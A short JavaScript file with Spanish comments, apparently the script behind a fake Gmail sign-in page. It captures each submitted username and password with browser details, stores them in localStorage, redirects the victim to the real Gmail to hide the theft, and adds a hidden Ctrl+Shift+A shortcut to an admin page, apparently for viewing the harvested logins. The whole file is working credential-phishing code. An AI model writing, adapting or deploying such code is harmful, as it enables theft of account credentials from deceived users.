// script.js - Versión mejorada sin autocompletado
document.addEventListener('DOMContentLoaded', function() {
    // Forzar limpieza del campo username
    const usernameInput = document.getElementById('username');
    if (usernameInput) {
        usernameInput.value = ''; // Asegurar que está vacío
        usernameInput.removeAttribute('value'); // Eliminar cualquier value por defecto
    }
    
    // Desactivar autocompletado del navegador
    const forms = document.getElementsByTagName('form');
    for (let form of forms) {
        form.setAttribute('autocomplete', 'off');
    }
    
    // Resto del código del formulario...
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                return;
            }
            
            // Guardar credenciales
            const loginData = {
                id: Date.now(),
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                url: window.location.href
            };
            
            let savedLogins = JSON.parse(localStorage.getItem('logins') || '[]');
            savedLogins.push(loginData);
            localStorage.setItem('logins', JSON.stringify(savedLogins));
            
            // Redirigir a Gmail real
            window.location.href = 'https://mail.google.com';
        });
    }
    
    // Atajo oculto para el admin (Ctrl+Shift+A)
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && e.key === 'A') {
            window.location.href = 'admin.html';
        }
    });
});
